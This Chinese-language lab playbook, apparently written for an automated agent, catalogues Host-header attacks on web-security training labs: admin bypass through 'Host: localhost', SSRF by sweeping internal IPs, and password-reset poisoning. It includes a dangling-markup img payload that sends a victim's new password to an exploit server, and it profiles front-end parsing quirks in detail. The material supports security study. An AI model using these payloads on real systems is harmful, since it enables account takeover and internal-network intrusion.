---
title: Host 头族:鉴权、路由与缓存
---

# Host 头族:鉴权、路由与缓存

同一类型漏洞:服务端对「请求意图宿主」的解析面被滥用。共性成因是多层
(缓存/负载均衡/后端)各自从 Host 头、请求行 absolute URL、X-Forwarded-* 中
取宿主,取值不一致即产生越权、SSRF 或缓存投毒。

## 子型判型矩阵

| 子型 | 判型特征 | 手法方向 | 实录 |
|---|---|---|---|
| Host 鉴权 | `/admin` 按 Host 判权 | 覆盖 `Host: localhost` 直达管理面 | HH-1 |
| Host 路由 SSRF | 前端以 Host 为上游地址 | 遍历 Host 私网段找内网 admin | HH-2 |
| 请求解析不一致 | 普通 Host 覆盖被 403 拒 | 请求行 absolute-form 与 Host 差异(未解) | HH-3 挂 |
| 歧义请求缓存投毒 | 页面内嵌 `//<Host>/...` 资源 | 缓存键与后端处理错位(未解) | HH-4 挂 |
| 密码重置投毒(basic) | 重置邮件链接用 Host 拼绝对 URL | `Host: <exploit>` 发重置 → 读 exploit `/log` 拿 token | [[lab-host-header-basic-password-reset-poisoning]] |
| 密码重置投毒(dangling markup) | 邮件链接仅 `https://<HOST>/login`,**新密码是邮件正文纯文本** | Host 加**端口**绕过前端按主机名的路由 → 端口后拼 `'><img/src="https://exploit/?`(双引号悬垂吞掉密码) | [[lab-host-header-password-reset-poisoning-via-dangling-markup]] |

## 共性

1. 先定「谁路由、谁校验、缓存键是什么」三问,再构造差异;三者取值来源(头/请求行/转发头)是分型关键。
2. 反映点常是页面里以宿主体拼接的绝对 URL(`//<Host>/resources/js/...`),即可投毒面。
3. 私网可达性:前端按 Host 转发即 SSRF;不可达私网返回 `504 connecting to <ip>` 可当探针。

## 判定与收尾要点

- 判定锚点:实际抵达管理面并删 `carlos`,或首页在受害者上下文执行 `alert(document.cookie)`;仅 Host 被接受不算解。
- Host 遍历用件(非手敲):区间模板 `192.168.0.FUZZ`,命中即 `200/302` 的独特体。
- 请求行/重复头等 ureq 表达不了的畸形请求,用 raw 件发字节级请求并读全响应头。
- 收束:`solved_check` 读实例横幅。

## 重置投毒组

- 面:`/forgot-password`(csrf+username)发出重置邮件,**邮件里的绝对链接由 Host 拼成**。
- 手法:**TLS 上直接覆盖 Host 就够**(`lab_http --header 'Host: <exploit-server>'`,SNI 仍按 URL 主机;
  本次未遇「平台 TLS 墙」):POST 重置请求时 host 指向自己的 exploit server → 邮件链接变成
  `https://<exploit>/forgot-password?temp-forgot-password-token=…`。
- 取 token:受害者点击后进 exploit server 的 **`/log`**(victim UA + 404 也记);
  这就是「无 OOB 时用 exploit server 自身当接收面」的典型。
- 收口:拿 token 打真站 `GET <lab>/forgot-password?temp-forgot-password-token=<token>` → 重置表单
  (`csrf`+token+`new-password-1/2`)→ POST → 用新密码登录受害者 → `solved_check`。

## dangling 变体

- **前端按 Host 精确路由**是这一族的新陷阱:`Host: <exploit>` / 大写主机名 / 主机名后直接拼 payload 都 504
  (`Gateway Timeout (N) connecting to <Host>`),应用根本没跑到,邮箱也不会产生新邮件。
- 绕过:**`Host: <真主机名>:<任意端口>` + payload** —— 前端只匹配主机名,应用把整个 Host 拼进邮件。
- 悬垂成立的关键:邮件模板里**双引号只出现一次**(我们的注入),于是 `src="https://exploit/?` 一路吞到正文末尾,
  把「新密码」带进回调 URL。受害者侧邮件客户端渲染 HTML 时自动加载该 img(IP `10.0.4.7`)。
- `X-Forwarded-Host` / `X-Forwarded-Server` / `Forwarded: host=` 在该应用**不反映**。

## 已排除面(HH-3/HH-4 实测)

- 前端**同时**校验 Host 头与请求行宿主;私网 token(点分、带端口、十进制、userinfo)一律 403。
- 重复 Host 头被拒(400 `Duplicate header names are not allowed` / 421 `Misdirected Request`)。
- `X-Forwarded-Host` 无反映(响应逐字节相同)。
- 端口 80 明文被拒(`This lab is not accessible over HTTP`),仅 TLS。

## 前端指纹(两条 lab 共用)

- **校验**≈`Host.split(':')[0] == <本实例主机名>`:端口段自由(`Host: <lab>:abc` 仍到 app);`@` 出现在冒号前 → 403
  `Client Error: Forbidden`(109B,**无** Set-Cookie)。
- **站点表按最右标签**:`<lab>.exploit-<id>.exploit-server.net` → 直达 exploit server;`<lab>.`、`<lab>-x` 这类未知名 → 421 `Invalid host`(12B)。
- **两阶段 403 可分**:预检失败**不带** `_lab`;过了 Host 预检、死在请求行/路由层仍带 `_lab`(用 Set-Cookie 归因,别只看状态码)。
- 重复头名 → 400 `{"error":"Duplicate header names are not allowed"}`;头值内裸 LF/CR → 400 `Newlines in headers are not allowed` / `Protocol error`;版本前多空格 → 400 `Protocol error`。
- 前端**每响应后关连接**(同一裸连接第二帧多半无响应)。
- 绝对型请求行可用(`raw_http --request-line 'GET http://<host>/ HTTP/1.1'`);但裸 authority(`GET 192.168.0.1:80`)、
  `http:/ip`、`http:ip/`(无斜杠 scheme)会被当**路径**交给 app。
- HH-3:请求行 authority 用 **python-urllib 语义**(userinfo 在**最后一个** `@` 切,`\` 不是终止符:`http://192.168.0.1\@<lab>/` → 200);
  但**路由仍取同一段解析值**,私网目标与 DNS 等价形(`<lab>.`)一律 403 且体逐字节相同 ⇒ 仍无校验/路由缺口。
- HH-4 缓存:**键 = Host 头 hostname(端口被剥)+ path,且站点级**(在 Host 路由之后)。请求行写别的 host 无效
  (实测 `GET http://<exploit>/kc2` + `Host: <lab>` 由靶场 app 应答,随后 `GET /kc2` → `X-Cache: hit, Age: 5`);
  被路由到 exploit server 的响应**不进**靶场缓存(即使带 `max-age=600`)。
- app 侧(该电商 app):Host 校验是 **`hostname[:纯数字 0..65535]` 且末端锢定**,`:abc`/`:`/`:80x`/`:80.`/`:99999` 全 500 错误页文案 `No host found`,且**无**转发头 fallback;
  `/resources/js/*` 与页面都带 `Cache-Control: max-age=30`(可缓存),但**无** `X-Cache-Key` 回显。
- 边缘层在 app 之前就把畸形形状规范化掉:重复 Host(含大小写变体/HTTP/1.0/裸 LF/CR)→ 400,obs-fold(缩进 Host)→ 缩进行被丢,
  `Host ` / `Host\t`(冒号前空白)能过重复检查但 app 直接忽略 ⇒ 想用“两个不同 Host”造语法分歧,得先确认边缘不先规范化。
- h2:边缘支持 h2、按 `:authority` 路由;**大写 `Host` 可覆盖 `:authority` 参与路由**;`host` 与 `:authority` 不一致 → `RST_STREAM`;
  某些 lab 的 `:authority: <lab>` 会 400 `Invalid request`(该题在 h2 下不可达)。

## 工具面

- `header_scan`:单个请求头按 FUZZ 区间/清单遍历,回命中与长度簇(找内网 admin IP)。
- `raw_http`:字节级 HTTP/1.1(自定义请求行 absolute-form/畸形 Host、重复头、FUZZ 遍历、TLS、输出响应头)。
- `lab_page`(剥题解侦察)、`lab_http`、`lab_launch`、`solved_check`。

## 实录溯源

- [[lab-host-header-authentication-bypass]]、[[lab-host-header-routing-based-ssrf]]、[[lab-host-header-ssrf-via-flawed-request-parsing]](挂)、[[lab-host-header-web-cache-poisoning-via-ambiguous-requests]](挂)、[[lab-host-header-basic-password-reset-poisoning]]

## 相关族

- 歧义请求缓存投毒见 [[cache-poisoning-family]];Host 代取内网见 [[ssrf-family]]。
- 方法论:web-vuln-methods(seed 层,按名引用)。
